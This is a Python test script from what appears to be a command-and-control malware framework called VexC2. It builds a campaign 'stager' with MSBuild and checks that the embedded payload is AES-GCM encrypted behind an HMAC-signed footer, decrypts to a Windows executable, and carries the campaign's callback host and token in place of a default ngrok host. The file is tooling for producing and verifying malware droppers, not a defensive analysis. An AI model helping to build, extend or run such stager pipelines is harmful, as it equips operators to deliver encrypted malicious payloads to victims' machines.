#!/usr/bin/env python3
"""Campaign builder test: compile a stager with unique host/token, verify.

No payload execution. Builds with MSBuild into isolated dirs, packs, then
checks the footer/HMAC and that the campaign values replaced the defaults.
"""

import hashlib
import hmac
import os
import re
import struct
import sys
import zlib

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "tools"))
sys.path.insert(0, os.path.join(ROOT, "VexC2"))
import campaign_build  # noqa: E402

FOOTER = struct.Struct("<8sQI16s12s16s32s")  # footer v3
MAGIC = b"VXPAY003"
KDF_LABEL = b"VEX-K3"


def _stage_key():
    try:
        text = open(os.path.join(ROOT, "loader", "stage_key.h"),
                    "r", encoding="utf-8").read()
    except OSError:
        return None
    vals = re.findall(r"0x([0-9a-fA-F]{2})", text)
    return bytes(int(v, 16) for v in vals)


HMAC_KEY = _stage_key()
OLD_HOST = "placidly-anteater-recolor.ngrok-free.dev"
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def decode_blob(blob: bytes):
    """Return (plaintext, crc) for a footer-v3 stager, or (None, None)."""
    if len(blob) <= FOOTER.size:
        return None, None
    magic, size, crc, salt, nonce, tag, mac = FOOTER.unpack(blob[-FOOTER.size:])
    if magic != MAGIC or size == 0 or size > len(blob) - FOOTER.size:
        return None, None
    ct = blob[len(blob) - FOOTER.size - size:len(blob) - FOOTER.size]
    expect = hmac.new(HMAC_KEY, ct, hashlib.sha256).digest()
    if not hmac.compare_digest(expect, mac):
        return None, None
    key = hmac.new(HMAC_KEY, KDF_LABEL + salt, hashlib.sha256).digest()
    try:
        from Crypto.Cipher import AES

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16)
        return cipher.decrypt_and_verify(ct, tag), crc
    except Exception:
        return None, None


def main() -> int:
    if not HMAC_KEY or len(HMAC_KEY) != 32:
        print("[!] loader/stage_key.h missing; run build.ps1 first")
        return 1
    if not campaign_build.available():
        print("[skip] MSBuild/loader unavailable")
        return 77

    host = "campaign-selftest.example"
    token = "campaign-selftest-token"
    try:
        meta = campaign_build.build("Builder Selftest", host, token)
    except Exception as exc:
        print("[-] build failed:", exc)
        return 1

    universal = meta["stager"]
    stager_x64 = meta["stager_x64"]
    payload_x64 = meta["payload"]
    payload_x86 = meta["payload_x86"]
    stage_x64 = meta["stage_x64"]
    ok("universal exists", os.path.isfile(universal))
    ok("universal is PE", open(universal, "rb").read(2) == b"MZ")
    ok("universal larger than x64 stager",
       os.path.getsize(universal) > os.path.getsize(stager_x64))
    ok("x64 stager larger than loader",
       os.path.getsize(stager_x64) > os.path.getsize(campaign_build.LOADER_X64))

    blob = open(stager_x64, "rb").read()
    plain, crc = decode_blob(blob)
    ok("footer magic", FOOTER.unpack(blob[-FOOTER.size:])[0] == MAGIC)
    ok("blob decrypts", plain is not None)
    if plain is not None:
        ok("crc32 of plaintext", (zlib.crc32(plain) & 0xFFFFFFFF) == crc)
        ok("payload starts with MZ", plain[:2] == b"MZ")

    for label, path in (("x64", payload_x64), ("x86", payload_x86)):
        pblob = open(path, "rb").read()
        ok(f"campaign host injected {label}",
           host.encode("utf-16-le") in pblob)
        ok(f"campaign token injected {label}",
           token.encode("utf-16-le") in pblob)
        ok(f"default host replaced {label}",
           OLD_HOST.encode("utf-16-le") not in pblob)
    ok("stage exists", os.path.isfile(stage_x64) and os.path.getsize(stage_x64) > 0)
    ok("metadata", os.path.isfile(os.path.join(os.path.dirname(universal),
                                               "campaign.json")))

    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
